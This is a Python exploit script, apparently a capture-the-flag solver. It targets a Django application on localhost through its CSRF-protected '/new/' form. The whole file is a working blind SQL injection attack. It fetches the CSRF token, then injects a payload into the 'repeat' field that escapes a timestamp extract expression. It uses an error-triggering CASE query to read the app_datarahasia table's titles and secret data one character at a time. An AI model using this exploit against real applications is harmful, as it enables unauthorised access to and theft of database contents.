import requests
import time

HOST = "http://localhost:9011"

def send_form(url, data):
    form = requests.get(url)

    html = form.content.decode()
    p1 = "csrfmiddlewaretoken\" value=\""
    p_bgn = html.find(p1) + len(p1)
    p2 = "\""
    p_end = html.find(p2, p_bgn)
 
    data['csrfmiddlewaretoken'] = html[p_bgn:p_end]

    resp = requests.post(url, cookies=form.cookies, data=data)
    return resp.content.decode()

def get_data(sqli_query):
    return {
        "repeat": f"year' from timestamp '2022-01-01 00:00:00') * ({sqli_query}))) RETURNING \"app_reminder\".\"id\";  -- ",
    }

def send_query(queryfmt, start=1, maxlen=20):
    data = ""
    for i in range(start,maxlen):
        is_done = True
        for j in range(32, 128):
            hrf = f"'{chr(j)}'"
            query = queryfmt.format(idx=i, hrf=j)
            
            resp = send_form(f"{HOST}/new/", get_data(query))
            if resp.find("wrong") != -1:
                data += chr(j)
                is_done = False
                break
        if is_done:
            break 
        print(data)
    return data

def extract_datarahasia_title():
    for i in range(1, 10):
        sqli_query = "SELECT CASE WHEN ascii(substring(title,{idx},1))={hrf} THEN 1000000000000000000000000000000 ELSE 0 END FROM app_datarahasia"
        sqli_query += f" where id={i}"
        data = send_query(sqli_query)
        if data == "": break
        print(i, ":", data)

def extract_datarahasia_data():
    sqli_query = "SELECT CASE WHEN ascii(substring(data,{idx},1))={hrf} THEN 1000000000000000000000000000000 ELSE 0 END FROM app_datarahasia"
    sqli_query += f" where id=3"
    data = send_query(sqli_query, 1, 100)
    
extract_datarahasia_title()
extract_datarahasia_data()